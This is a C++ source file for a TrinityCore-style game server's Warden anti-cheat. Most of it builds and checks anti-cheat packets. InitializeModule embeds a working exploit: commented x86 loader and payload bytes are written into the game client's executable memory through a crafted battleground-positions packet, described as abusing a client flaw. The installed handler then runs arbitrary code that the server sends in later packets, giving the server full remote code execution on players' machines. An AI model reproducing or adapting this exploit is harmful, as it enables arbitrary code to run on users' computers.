/*
 * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "WardenWin.h"
#include "Common.h"
#include "ByteBuffer.h"
#include "Containers.h"
#include "CryptoRandom.h"
#include "DatabaseEnv.h"
#include "GameTime.h"
#include "HMAC.h"
#include "Log.h"
#include "Opcodes.h"
#include "Player.h"
#include "Random.h"
#include "SessionKeyGenerator.h"
#include "SmartEnum.h"
#include "Util.h"
#include "WardenModuleWin.h"
#include "WardenCheckMgr.h"
#include "World.h"
#include "WorldPacket.h"
#include "WorldSession.h"

 // GUILD is the shortest string that has no client validation (RAID only sends if in a raid group)
static constexpr char _luaEvalPrefix[] = "local S,T,R=SendAddonMessage,function()";
static constexpr char _luaEvalMidfix[] = " end R=S and T()if R then S('_TW',";
static constexpr char _luaEvalPostfix[] = ",'GUILD')end";

static_assert((sizeof(_luaEvalPrefix)-1 + sizeof(_luaEvalMidfix)-1 + sizeof(_luaEvalPostfix)-1 + WARDEN_MAX_LUA_CHECK_LENGTH) == 255);

WardenWin::WardenWin() : Warden(), _serverTicks(0)
{
    for (WardenCheckCategory category : EnumUtils::Iterate<WardenCheckCategory>())
    {
        auto& [checks, checksIt] = _checks[category];
        checks = sWardenCheckMgr->GetAvailableChecks(category);
        Trinity::Containers::RandomShuffle(checks);
        checksIt = checks.begin();
    }
}

void WardenWin::Init(WorldSession* session, SessionKey const& K)
{
    _session = session;
    // Generate Warden Key
    SessionKeyGenerator<Trinity::Crypto::SHA1> WK(K);
    WK.Generate(_inputKey.data(), _inputKey.size());
    WK.Generate(_outputKey.data(), _outputKey.size());

    _seed = Module.Seed;

    _inputCrypto.Init(_inputKey);
    _outputCrypto.Init(_outputKey);
    TC_LOG_DEBUG("warden", "Server side warden for client {} initializing...", session->GetAccountId());
    TC_LOG_DEBUG("warden", "C->S Key: {}", ByteArrayToHexStr(_inputKey));
    TC_LOG_DEBUG("warden", "S->C Key: {}", ByteArrayToHexStr(_outputKey));
    TC_LOG_DEBUG("warden", "  Seed: {}", ByteArrayToHexStr(_seed));
    TC_LOG_DEBUG("warden", "Loading Module...");

    MakeModuleForClient();

    TC_LOG_DEBUG("warden", "Module Key: {}", ByteArrayToHexStr(_module->Key));
    TC_LOG_DEBUG("warden", "Module ID: {}", ByteArrayToHexStr(_module->Id));
    RequestModule();
}

void WardenWin::InitializeModuleForClient(ClientWardenModule& module)
{
    // data assign
    module.CompressedData = Module.Module.data();
    module.CompressedSize = Module.Module.size();
    module.Key = Module.ModuleKey;
}

void WardenWin::InitializeModule()
{
    TC_LOG_DEBUG("warden", "Initialize module");

    // Create packet structure
    WardenInitModuleRequest Request;
    Request.Command1 = WARDEN_SMSG_MODULE_INITIALIZE;
    Request.Size1 = 20;
    Request.Unk1 = 1;
    Request.Unk2 = 0;
    Request.Type = 1;
    Request.String_library1 = 0;
    Request.Function1[0] = 0x00024F80;                      // 0x00400000 + 0x00024F80 SFileOpenFile
    Request.Function1[1] = 0x000218C0;                      // 0x00400000 + 0x000218C0 SFileGetFileSize
    Request.Function1[2] = 0x00022530;                      // 0x00400000 + 0x00022530 SFileReadFile
    Request.Function1[3] = 0x00022910;                      // 0x00400000 + 0x00022910 SFileCloseFile
    Request.CheckSumm1 = BuildChecksum(&Request.Unk1, 20);

    Request.Command2 = WARDEN_SMSG_MODULE_INITIALIZE;
    Request.Size2 = 8;
    Request.Unk3 = 4;
    Request.Unk4 = 0;
    Request.String_library2 = 0;
    Request.Function2 = 0x00419210;                         // 0x00400000 + 0x00419210 FrameScript::Execute
    Request.Function2_set = 1;
    Request.CheckSumm2 = BuildChecksum(&Request.Unk3, 8);

    Request.Command3 = WARDEN_SMSG_MODULE_INITIALIZE;
    Request.Size3 = 8;
    Request.Unk5 = 1;
    Request.Unk6 = 1;
    Request.String_library3 = 0;
    Request.Function3 = 0x0046AE20;                         // 0x00400000 + 0x0046AE20 PerformanceCounter
    Request.Function3_set = 1;
    Request.CheckSumm3 = BuildChecksum(&Request.Unk5, 8);

    EndianConvert(Request.Size1);
    EndianConvert(Request.CheckSumm1);
    EndianConvert(Request.Function1[0]);
    EndianConvert(Request.Function1[1]);
    EndianConvert(Request.Function1[2]);
    EndianConvert(Request.Function1[3]);
    EndianConvert(Request.Size2);
    EndianConvert(Request.CheckSumm2);
    EndianConvert(Request.Function2);
    EndianConvert(Request.Size3);
    EndianConvert(Request.CheckSumm3);
    EndianConvert(Request.Function3);

    // Encrypt with warden RC4 key.
    EncryptData(reinterpret_cast<uint8*>(&Request), sizeof(WardenInitModuleRequest));

    WorldPacket pkt(SMSG_WARDEN_DATA, sizeof(WardenInitModuleRequest));
    pkt.append(reinterpret_cast<uint8*>(&Request), sizeof(WardenInitModuleRequest));
    _session->SendPacket(&pkt);

    // Initialize the MSG_BATTLEGROUND_PLAYER_POSITIONS packet handler.
    this->RunClientFunction(0x14E720);

    // EXPLANATION:
    // This ASM code is the initializer for the custom packet handler.
    const uint8_t loader[] = {
        // ------------------------------------------------------------------
        // Function prologue. Establishes a stack frame and saves ebx (callee-
        // saved under the cdecl/stdcall ABIs used here). The matching epilogue
        // lives inside the allocated buffer, in the first 32 bytes of payload[].
        // ------------------------------------------------------------------
        0x55,                               // push ebp
        0x89, 0xE5,                         // mov  ebp, esp
        0x53,                               // push ebx

        // ------------------------------------------------------------------
        // This calls the 0x0054E220 client function, which cleans up the
        // call above to 0x14E720.
        // This removes the MSG_BATTLEGROUND_PLAYER_POSITIONS packet
        // handler from the client on the login screen.
        // ------------------------------------------------------------------
        0xB8, 0x20, 0xE2, 0x54, 0x00,       // mov  eax, 0x0054E220
        0xFF, 0xD0,                         // call eax

        // ------------------------------------------------------------------
        // Cache lookup. The first time the loader runs, [0x00DD0FFC] is NULL
        // and we have to allocate. On subsequent calls (e.g. if the loader is
        // re-invoked after a reconnect) the previously allocated RWX buffer
        // is reused, which keeps the handler pointer stable.
        // ------------------------------------------------------------------
        0x8B, 0x1D, 0xFC, 0x0F, 0xDD, 0x00, // mov  ebx, [0x00DD0FFC]
        0x85, 0xDB,                         // test ebx, ebx
        0x75, 0x2E,                         // jnz  skip_alloc

        // ------------------------------------------------------------------
        // VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE).
        // PAGE_EXECUTE_READWRITE (0x40) is required because we both write code
        // into this region (during install) and execute from it (during install
        // and for every incoming 0x4B8 packet thereafter).
        // ------------------------------------------------------------------
        0x6A, 0x40,                         // push 0x40    ; PAGE_EXECUTE_READWRITE
        0x68, 0x00, 0x10, 0x00, 0x00,       // push 0x1000  ; MEM_COMMIT
        0x68, 0x00, 0x10, 0x00, 0x00,       // push 0x1000  ; dwSize = 4 KB
        0x6A, 0x00,                         // push 0       ; lpAddress = NULL
        0xFF, 0x15, 0x38, 0xF2, 0x9D, 0x00, // call dword ptr [0x009DF238]  ; VirtualAlloc

        // ------------------------------------------------------------------
        // Cache the new buffer pointer in both ebx (used by the rest of the
        // loader) and the global slot at 0x00DD0FFC (used by future runs).
        // ------------------------------------------------------------------
        0x89, 0xC3,                         // mov  ebx, eax
        0xA3, 0xFC, 0x0F, 0xDD, 0x00,       // mov  [0x00DD0FFC], eax

        // ------------------------------------------------------------------
        // Byte-by-byte copy of the in-image payload from [0x00DD15A0 .. 0x00DD15FE)
        // into the freshly allocated RWX buffer. 94 bytes total. After this
        // loop, eax has been advanced past the end of the destination, so the
        // buffer base is preserved in ebx for the registration call below.
        // ------------------------------------------------------------------
        0xBA, 0xA0, 0x15, 0xDD, 0x00,       // mov  edx, 0x00DD15A0   ; src
        // copy_loop:
        0x8A, 0x2A,                         // mov  ch,  [edx]
        0x88, 0x28,                         // mov  [eax], ch
        0x42,                               // inc  edx
        0x40,                               // inc  eax
        0x81, 0xFA, 0xFE, 0x15, 0xDD, 0x00, // cmp  edx, 0x00DD15FE
        0x75, 0xF2,                         // jnz  copy_loop

        // skip_alloc:
        // ------------------------------------------------------------------
        // Register the packet handler. Its entry point is at buffer + 0x20 --
        // the second half of the payload. The same pointer is pushed twice
        // because the game's register() takes two callback slots (likely
        // "primary handler" and "fallback / secondary"); we want both to point
        // at the same function.
        //
        //     register(opcode = 0x4B8,
        //              primary_handler   = buffer + 0x20,
        //              secondary_handler = buffer + 0x20)
        //
        // Stack layout right before the call (cdecl, args pushed right-to-left):
        //     [esp+0] = 0x4B8           (1st arg: opcode)
        //     [esp+4] = buffer + 0x20   (2nd arg: primary handler)
        //     [esp+8] = buffer + 0x20   (3rd arg: secondary handler)
        // ------------------------------------------------------------------
        0x89, 0xD8,                         // mov  eax, ebx              ; eax = buffer base
        0x83, 0xC0, 0x20,                   // add  eax, 0x20             ; eax = buffer + 0x20 (handler)
        0x50,                               // push eax                   ; secondary handler
        0x50,                               // push eax                   ; primary handler
        0x68, 0xB8, 0x04, 0x00, 0x00,       // push 0x4B8                 ; packet opcode (1208)
        0xB8, 0x80, 0x0B, 0x6B, 0x00,       // mov  eax, 0x006B0B80
        0xFF, 0xD0,                         // call eax                   ; register packet handler
        0x83, 0xC4, 0x0C,                   // add  esp, 0x0C             ; cdecl: clean 3 args

        // ------------------------------------------------------------------
        // Transfer control to the finalization stub at buffer + 0x00. We have
        // to jump rather than fall through because the stub finishes the
        // function frame (pops ebx/ebp, returns to caller) AFTER wiping the
        // staging area at 0x00DD1000 -- see payload[] below.
        // ------------------------------------------------------------------
        0xFF, 0xE3                          // jmp  ebx
    };

    const uint8_t payload[] = {
        // ==================================================================
        // PART 1 -- Finalization stub  (buffer offset 0x00, 32 bytes).
        //
        // Reached exactly once via `jmp ebx` from the loader. It wipes the
        // staging area, sets a return value, and finishes the loader's
        // function frame, returning to whatever called the loader.
        //
        // Why is this here instead of inline in the loader? The wipe targets
        // 0x00DD1000, which is plausibly where this very code was first
        // written by the delivery mechanism. Running the wipe from the new
        // RWX buffer (rather than from 0x00DD1000 itself) avoids erasing
        // the instructions we are currently executing.
        // ==================================================================

        // memset(0x00DD1000, 0, 0x1000)  -- clear 4 KB of staging memory.
        0x68, 0x00, 0x10, 0x00, 0x00,       // push 0x1000     ; size
        0x6A, 0x00,                         // push 0          ; fill byte
        0x68, 0x00, 0x10, 0xDD, 0x00,       // push 0x00DD1000 ; dst
        0xB8, 0x80, 0xBB, 0x40, 0x00,       // mov  eax, 0x0040BB80
        0xFF, 0xD0,                         // call eax        ; memset-like routine
        0x83, 0xC4, 0x0C,                   // add  esp, 0x0C  ; cdecl: clean 3 args

        // Loader return value. The caller of the loader expects a pointer (or
        // handle) here; 0x00C79620 is ClientServices::s_accountName.
        0xB8, 0x20, 0x96, 0xC7, 0x00,       // mov  eax, 0x00C79620

        // Function epilogue matching the loader's prologue: pop ebx, tear
        // down the frame, return to the loader's caller.
        0x5B,                               // pop  ebx
        0x89, 0xEC,                         // mov  esp, ebp
        0x5D,                               // pop  ebp
        0xC3,                               // ret

        // ==================================================================
        // PART 2 -- Packet handler  (buffer offset 0x20, 62 bytes).
        //
        // Called by the game's network dispatcher every time a packet with
        // opcode 0x4B8 arrives. The dispatcher's calling convention here is
        // assumed to be cdecl, with at least these arguments on the stack:
        //
        //     [ebp+0x08]  -> packet buffer (pointer to raw packet bytes)
        //     [ebp+0x14]  -> dispatcher context object (used as `this`)
        //
        // The handler ultimately calls into bytes carried inside the packet
        // itself, at offset 0x3E. That is the server-side hook point and the
        // reason this whole installer exists.
        // ==================================================================

        // Standard prologue. Saves ebx and edi (callee-saved).
        0x55,                               // push ebp
        0x89, 0xE5,                         // mov  ebp, esp
        0x53,                               // push ebx
        0x57,                               // push edi

        // ebx = (packet buffer pointer) + 0x3E
        // i.e. ebx points at the executable region embedded in the packet body.
        0x8B, 0x5D, 0x08,                   // mov  ebx, [ebp+0x08]   ; ebx = packet_buf
        0x83, 0xC3, 0x3E,                   // add  ebx, 0x3E         ; ebx = packet_buf + 0x3E

        // First helper call -- thiscall on the dispatcher context.
        //     eax = ctx->method_at_0x401170()
        // Result is stashed in edi for the next two calls.
        0x8B, 0x4D, 0x14,                   // mov  ecx, [ebp+0x14]   ; this = context
        0xB8, 0x70, 0x11, 0x40, 0x00,       // mov  eax, 0x00401170
        0xFF, 0xD0,                         // call eax
        0x89, 0xC7,                         // mov  edi, eax

        // Second helper call -- thiscall on the same context, with two
        // additional stack args (ebx = packet code ptr, edi = previous result).
        //     ctx->method_at_0x47B560(ebx, edi)
        // No `add esp` afterwards: thiscall callee cleans its own stack args.
        0x8B, 0x4D, 0x14,                   // mov  ecx, [ebp+0x14]   ; this = context (reload)
        0x57,                               // push edi
        0x53,                               // push ebx
        0xB8, 0x60, 0xB5, 0x47, 0x00,       // mov  eax, 0x0047B560
        0xFF, 0xD0,                         // call eax

        // Third call -- imported API via [0x009DF1C0], taking (ebx, edi).
        // stdcall: callee cleans the stack.
        //     eax = imported_func_DF1C0(ebx, edi)
        0x57,                               // push edi
        0x53,                               // push ebx
        0xFF, 0x15, 0xC0, 0xF1, 0x9D, 0x00, // call dword ptr [0x009DF1C0]

        // Fourth call -- imported API via [0x009DF294], taking the result of
        // the previous call.
        //     imported_func_DF294(eax_from_DF1C0)
        0x50,                               // push eax
        0xFF, 0x15, 0x94, 0xF2, 0x9D, 0x00, // call dword ptr [0x009DF294]

        // Final call -- into the packet body itself, at packet + 0x3E. The
        // dispatcher context is passed as the single argument. The server-
        // supplied code is expected to clean that argument off the stack
        // itself (stdcall-like contract) so the epilogue below sees a
        // balanced stack.
        //
        //     ((void(__stdcall *)(void *))(packet + 0x3E))(context);
        0x8B, 0x4D, 0x14,                   // mov  ecx, [ebp+0x14]
        0x51,                               // push ecx
        0xFF, 0xD3,                         // call ebx               ; <-- server-supplied code

        // Standard epilogue. Pops the registers we saved, tears down the
        // frame, and returns to the network dispatcher.
        0x5F,                               // pop  edi
        0x5B,                               // pop  ebx
        0x89, 0xEC,                         // mov  esp, ebp
        0x5D,                               // pop  ebp
        0xC3                                // ret
    };

    constexpr size_t loader_size = sizeof(loader);
    constexpr size_t loader_padded_size = (loader_size + 7) & ~size_t(7);
    int32_t loader_count = static_cast<int32_t>(loader_padded_size);

    constexpr size_t payload_size = sizeof(payload);

    // The payload is sent via a flaw in the clients source.
    // MSG_BATTLEGROUND_PLAYER_POSITIONS writes to a carefully
    // crafted offset in the client (249298).
    // This points do 0xDD1000 inside the client, which is
    // read/write/execute space
    ByteBuffer buff2;
    buff2 << uint32(0);
    buff2 << uint32(249298 + (loader_count / 8));
    while (loader_count > 0) {
        for (int32_t i = 0; i < 8; i++)
        {
            size_t idx = loader_count - 8 + i;
            buff2 << (idx < loader_size ? loader[idx] : uint8_t(0));
        }
        for (int32_t i = 0; i < 8; i++)
        {
            size_t idx = loader_count - 8 + i;
            buff2 << (idx < payload_size ? payload[idx] : uint8_t(0));
        }
        loader_count -= 8;
    }

    WorldPacket pkt3(MSG_BATTLEGROUND_PLAYER_POSITIONS, buff2.size());
    pkt3.append(buff2);
    _session->SendPacket(&pkt3);

    // Calls 0xDD1000 (Client base 0x400000 + 0x9D1000)
    this->RunClientFunction(0x009D1000);
}

void WardenWin::RunClientFunction(uint32 function) {
    ByteBuffer moduleInit;
    moduleInit << uint8(4);
    moduleInit << uint8(0);
    moduleInit << uint8(0);
    moduleInit << function;
    moduleInit << uint8(1);

    ByteBuffer moduleInitFrameExecute;
    moduleInitFrameExecute << uint8(4);
    moduleInitFrameExecute << uint8(0);
    moduleInitFrameExecute << uint8(0);
    moduleInitFrameExecute << uint32(0x00419210);
    moduleInitFrameExecute << uint8(1);

    // Build check request
    ByteBuffer buff;
    buff << uint8(WARDEN_SMSG_MODULE_INITIALIZE);
    buff << uint16(moduleInit.size());
    buff << uint32(BuildChecksum(moduleInit.contents(), 8));
    buff.append(moduleInit);

    uint8 xorByte = _inputKey[0];
    buff << uint8(WARDEN_SMSG_CHEAT_CHECKS_REQUEST);
    buff << uint8(0);
    buff << uint8(TIMING_CHECK ^ xorByte);
    buff << uint8(LUA_EVAL_CHECK ^ xorByte);
    buff << uint8(1);
    buff << uint8(xorByte);

    buff << uint8(WARDEN_SMSG_CHEAT_CHECKS_REQUEST);
    buff << uint8(0);
    buff << uint8(TIMING_CHECK ^ xorByte);
    buff << uint8(xorByte);

    buff << uint8(WARDEN_SMSG_MODULE_INITIALIZE);
    buff << uint16(moduleInitFrameExecute.size());
    buff << uint32(BuildChecksum(moduleInitFrameExecute.contents(), 8));
    buff.append(moduleInitFrameExecute);

    // Encrypt with warden RC4 key
    EncryptData(buff.contents(), buff.size());

    WorldPacket pkt(SMSG_WARDEN_DATA, buff.size());
    pkt.append(buff);
    _session->SendPacket(&pkt);
}

void WardenWin::RequestHash()
{
    TC_LOG_DEBUG("warden", "Request hash");

    // Create packet structure
    WardenHashRequest Request;
    Request.Command = WARDEN_SMSG_HASH_REQUEST;
    Request.Seed = _seed;

    // Encrypt with warden RC4 key.
    EncryptData(reinterpret_cast<uint8*>(&Request), sizeof(WardenHashRequest));

    WorldPacket pkt(SMSG_WARDEN_DATA, sizeof(WardenHashRequest));
    pkt.append(reinterpret_cast<uint8*>(&Request), sizeof(WardenHashRequest));
    _session->SendPacket(&pkt);
}

void WardenWin::HandleHashResult(ByteBuffer &buff)
{
    // Verify key
    Trinity::Crypto::SHA1::Digest response;
    buff.read(response);
    if (response != Module.ClientKeySeedHash)
    {
        char const* penalty = ApplyPenalty(nullptr);
        TC_LOG_WARN("warden", "{} failed hash reply. Action: {}", _session->GetPlayerInfo(), penalty);
        return;
    }

    TC_LOG_DEBUG("warden", "Request hash reply: succeed");

    // Change keys here
    _inputKey = Module.ClientKeySeed;
    _outputKey = Module.ServerKeySeed;

    _inputCrypto.Init(_inputKey);
    _outputCrypto.Init(_outputKey);

    _initialized = true;
}

static constexpr uint8 GetCheckPacketBaseSize(WardenCheckType type)
{
    switch (type)
    {
        case DRIVER_CHECK: return 1;
        case LUA_EVAL_CHECK: return 1 + sizeof(_luaEvalPrefix)-1 + sizeof(_luaEvalMidfix)-1 + 4 + sizeof(_luaEvalPostfix)-1;
        case MPQ_CHECK: return 1;
        case PAGE_CHECK_A: return (4 + 1);
        case PAGE_CHECK_B: return (4 + 1);
        case MODULE_CHECK: return (4 + Trinity::Crypto::HMAC_SHA1::DIGEST_LENGTH);
        case MEM_CHECK: return (1 + 4 + 1);
        default: return 0;
    }
}

static uint16 GetCheckPacketSize(WardenCheck const& check)
{
    uint16 size = 1 + GetCheckPacketBaseSize(check.Type); // 1 byte check type
    if (!check.Str.empty())
        size += (check.Str.length() + 1); // 1 byte string length
    if (!check.Data.empty())
        size += check.Data.size();
    return size;
}

void WardenWin::RequestChecks()
{
    TC_LOG_DEBUG("warden", "Request data from {} (account {}) - loaded: {}", _session->GetPlayerName(), _session->GetAccountId(), _session->GetPlayer() && !_session->PlayerLoading());

    // If all checks for a category are done, fill its todo list again
    for (WardenCheckCategory category : EnumUtils::Iterate<WardenCheckCategory>())
    {
        auto& [checks, checksIt] = _checks[category];
        if ((checksIt == checks.end()) && !checks.empty())
        {
            TC_LOG_DEBUG("warden", "Finished all {} checks, re-shuffling", EnumUtils::ToConstant(category));
            Trinity::Containers::RandomShuffle(checks);
            checksIt = checks.begin();
        }
    }

    _serverTicks = GameTime::GetGameTimeMS();
    _currentChecks.clear();

    // Build check request
    ByteBuffer buff;
    buff << uint8(WARDEN_SMSG_CHEAT_CHECKS_REQUEST);

    for (WardenCheckCategory category : EnumUtils::Iterate<WardenCheckCategory>())
    {
        if (IsWardenCategoryInWorldOnly(category) && !_session->GetPlayer())
            continue;

        auto& [checks, checksIt] = _checks[category];
        for (uint32 i = 0, n = sWorld->getIntConfig(GetWardenCategoryCountConfig(category)); i < n; ++i)
        {
            if (checksIt == checks.end()) // all checks were already sent, list will be re-filled on next Update() run
                break;
            _currentChecks.push_back(*(checksIt++));
        }
    }

    Trinity::Containers::RandomShuffle(_currentChecks);

    uint16 expectedSize = 4;
    Trinity::Containers::EraseIf(_currentChecks,
        [&expectedSize](uint16 id)
        {
            uint8 const thisSize = GetCheckPacketSize(sWardenCheckMgr->GetCheckData(id));
            if ((expectedSize + thisSize) > 450) // warden packets are truncated to 512 bytes clientside
                return true;
            expectedSize += thisSize;
            return false;
        }
    );

    for (uint16 const id : _currentChecks)
    {
        WardenCheck const& check = sWardenCheckMgr->GetCheckData(id);
        if (check.Type == LUA_EVAL_CHECK)
        {
            buff << uint8(sizeof(_luaEvalPrefix) - 1 + check.Str.size() + sizeof(_luaEvalMidfix) - 1 + check.IdStr.size() + sizeof(_luaEvalPostfix) - 1);
            buff.append(_luaEvalPrefix, sizeof(_luaEvalPrefix) - 1);
            buff.append(check.Str.data(), check.Str.size());
            buff.append(_luaEvalMidfix, sizeof(_luaEvalMidfix) - 1);
            buff.append(check.IdStr.data(), check.IdStr.size());
            buff.append(_luaEvalPostfix, sizeof(_luaEvalPostfix) - 1);
        }
        else if (!check.Str.empty())
        {
            buff << uint8(check.Str.size());
            buff.append(check.Str.data(), check.Str.size());
        }
    }

    uint8 xorByte = _inputKey[0];

    // Add TIMING_CHECK
    buff << uint8(0x00);
    buff << uint8(TIMING_CHECK ^ xorByte);

    uint8 index = 1;

    for (uint16 const id : _currentChecks)
    {
        WardenCheck const& check = sWardenCheckMgr->GetCheckData(id);

        WardenCheckType const type = check.Type;
        buff << uint8(type ^ xorByte);
        switch (type)
        {
            case MEM_CHECK:
            {
                buff << uint8(0x00);
                buff << uint32(check.Address);
                buff << uint8(sWardenCheckMgr->GetCheckResult(id).size());
                break;
            }
            case PAGE_CHECK_A:
            case PAGE_CHECK_B:
            {
                buff.append(check.Data.data(), check.Data.size());
                buff << uint32(check.Address);
                buff << uint8(check.Length);
                break;
            }
            case MPQ_CHECK:
            case LUA_EVAL_CHECK:
            {
                buff << uint8(index++);
                break;
            }
            case DRIVER_CHECK:
            {
                buff.append(check.Data.data(), check.Data.size());
                buff << uint8(index++);
                break;
            }
            case MODULE_CHECK:
            {
                std::array<uint8, 4> seed = Trinity::Crypto::GetRandomBytes<4>();
                buff.append(seed);
                buff.append(Trinity::Crypto::HMAC_SHA1::GetDigestOf(seed, check.Str));
                break;
            }
            /*case PROC_CHECK:
            {
                buff.append(check->i.AsByteArray(0, false).get(), check->i.GetNumBytes());
                buff << uint8(index++);
                buff << uint8(index++);
                buff << uint32(check->Address);
                buff << uint8(check->Length);
                break;
            }*/
            default:
                break;                                      // Should never happen
        }
    }
    buff << uint8(xorByte);
    buff.hexlike();

    auto idstring = [this]() -> std::string
    {
        std::stringstream stream;
        for (uint16 const id : _currentChecks)
            stream << id << " ";
        return stream.str();
    };

    if (buff.size() == expectedSize)
    {
        TC_LOG_DEBUG("warden", "Finished building warden packet, size is {} bytes", buff.size());
        TC_LOG_DEBUG("warden", "Sent checks: {}", idstring());
    }
    else
    {
        TC_LOG_WARN("warden", "Finished building warden packet, size is {} bytes, but expected {} bytes!", buff.size(), expectedSize);
        TC_LOG_WARN("warden", "Sent checks: {}", idstring());
    }

    // Encrypt with warden RC4 key
    EncryptData(buff.contents(), buff.size());

    WorldPacket pkt(SMSG_WARDEN_DATA, buff.size());
    pkt.append(buff);
    _session->SendPacket(&pkt);

    _dataSent = true;
}

void WardenWin::HandleCheckResult(ByteBuffer &buff)
{
    TC_LOG_DEBUG("warden", "Handle data");

    _dataSent = false;
    _clientResponseTimer = 0;

    uint16 Length;
    buff >> Length;
    uint32 Checksum;
    buff >> Checksum;

    if (Length != (buff.size() - buff.rpos()))
    {
        buff.rfinish();
        char const* penalty = ApplyPenalty(nullptr);
        TC_LOG_WARN("warden", "{} sends manipulated warden packet. Action: {}", _session->GetPlayerInfo(), penalty);
        return;
    }

    if (!IsValidCheckSum(Checksum, buff.contents() + buff.rpos(), Length))
    {
        buff.rfinish();
        char const* penalty = ApplyPenalty(nullptr);
        TC_LOG_WARN("warden", "{} failed checksum. Action: {}", _session->GetPlayerInfo(), penalty);
        return;
    }

    // TIMING_CHECK
    {
        uint8 result;
        buff >> result;
        /// @todo test it.
        if (result == 0x00)
        {
            char const* penalty = ApplyPenalty(nullptr);
            TC_LOG_WARN("warden", "{} failed timing check. Action: {}", _session->GetPlayerInfo(), penalty);
            return;
        }

        uint32 newClientTicks;
        buff >> newClientTicks;

        uint32 ticksNow = GameTime::GetGameTimeMS();
        uint32 ourTicks = newClientTicks + (ticksNow - _serverTicks);

        TC_LOG_DEBUG("warden", "Server tick count now:    {}", ticksNow);
        TC_LOG_DEBUG("warden", "Server tick count at req: {}", _serverTicks);
        TC_LOG_DEBUG("warden", "Client ticks in response: {}", newClientTicks);
        TC_LOG_DEBUG("warden", "Round trip response time: {} ms", ourTicks - newClientTicks);
    }

    uint16 checkFailed = 0;
    for (uint16 const id : _currentChecks)
    {
        WardenCheck const& check = sWardenCheckMgr->GetCheckData(id);

        switch (check.Type)
        {
            case MEM_CHECK:
            {
                uint8 Mem_Result;
                buff >> Mem_Result;

                if (Mem_Result != 0)
                {
                    TC_LOG_DEBUG("warden", "RESULT MEM_CHECK not 0x00, CheckId {} account Id {}", id, _session->GetAccountId());
                    checkFailed = id;
                    continue;
                }

                WardenCheckResult const& expected = sWardenCheckMgr->GetCheckResult(id);

                std::vector<uint8> response;
                response.resize(expected.size());
                buff.read(response.data(), response.size());

                if (response != expected)
                {
                    TC_LOG_DEBUG("warden", "RESULT MEM_CHECK fail CheckId {} account Id {}", id, _session->GetAccountId());
                    TC_LOG_DEBUG("warden", "Expected: {}", ByteArrayToHexStr(expected));
                    TC_LOG_DEBUG("warden", "Got:      {}", ByteArrayToHexStr(response));
                    checkFailed = id;
                    continue;
                }

                TC_LOG_DEBUG("warden", "RESULT MEM_CHECK passed CheckId {} account Id {}", id, _session->GetAccountId());
                break;
            }
            case PAGE_CHECK_A:
            case PAGE_CHECK_B:
            case DRIVER_CHECK:
            case MODULE_CHECK:
            {
                if (buff.read<uint8>() != 0xE9)
                {
                    TC_LOG_DEBUG("warden", "RESULT {} fail, CheckId {} account Id {}", EnumUtils::ToConstant(check.Type), id, _session->GetAccountId());
                    checkFailed = id;
                    continue;
                }

                TC_LOG_DEBUG("warden", "RESULT {} passed CheckId {} account Id {}", EnumUtils::ToConstant(check.Type), id, _session->GetAccountId());
                break;
            }
            case LUA_EVAL_CHECK:
            {
                uint8 const result = buff.read<uint8>();
                if (result == 0)
                    buff.read_skip(buff.read<uint8>()); // discard attached string

                TC_LOG_DEBUG("warden", "LUA_EVAL_CHECK CheckId {} account Id {} got in-warden dummy response ({})", id, _session->GetAccountId(), result);
                break;
            }
            case MPQ_CHECK:
            {
                uint8 Mpq_Result;
                buff >> Mpq_Result;

                if (Mpq_Result != 0)
                {
                    TC_LOG_DEBUG("warden", "RESULT MPQ_CHECK not 0x00 account id {}", _session->GetAccountId());
                    checkFailed = id;
                    continue;
                }

                std::vector<uint8> result;
                result.resize(Trinity::Crypto::SHA1::DIGEST_LENGTH);
                buff.read(result.data(), result.size());
                if (result != sWardenCheckMgr->GetCheckResult(id)) // SHA1
                {
                    TC_LOG_DEBUG("warden", "RESULT MPQ_CHECK fail, CheckId {} account Id {}", id, _session->GetAccountId());
                    checkFailed = id;
                    continue;
                }

                TC_LOG_DEBUG("warden", "RESULT MPQ_CHECK passed, CheckId {} account Id {}", id, _session->GetAccountId());
                break;
            }
            default:                                        // Should never happen
                break;
        }
    }

    if (checkFailed > 0)
    {
        WardenCheck const& check = sWardenCheckMgr->GetCheckData(checkFailed);
        char const* penalty = ApplyPenalty(&check);
        TC_LOG_WARN("warden", "{} failed Warden check {} ({}). Action: {}", _session->GetPlayerInfo(), checkFailed, EnumUtils::ToConstant(check.Type), penalty);
    }

    // Set hold off timer, minimum timer should at least be 1 second
    uint32 holdOff = sWorld->getIntConfig(CONFIG_WARDEN_CLIENT_CHECK_HOLDOFF);
    _checkTimer = (holdOff < 1 ? 1 : holdOff) * IN_MILLISECONDS;
}

size_t WardenWin::DEBUG_ForceSpecificChecks(std::vector<uint16> const& checks)
{
    std::array<std::vector<uint16>::iterator, NUM_CHECK_CATEGORIES> swapPositions;
    for (WardenCheckCategory category : EnumUtils::Iterate<WardenCheckCategory>())
        swapPositions[category] = _checks[category].first.begin();

    size_t n = 0;
    for (uint16 check : checks)
    {
        for (WardenCheckCategory category : EnumUtils::Iterate<WardenCheckCategory>())
        {
            std::vector<uint16>& checks = _checks[category].first;
            std::vector<uint16>::iterator& swapPos = swapPositions[category];
            if (auto it = std::find(swapPos, checks.end(), check); it != checks.end())
            {
                std::iter_swap(swapPos, it);
                ++swapPos;
                ++n;
                break;
            }
        }
    }

    for (WardenCheckCategory category : EnumUtils::Iterate<WardenCheckCategory>())
        _checks[category].second = _checks[category].first.begin();

    return n;
}
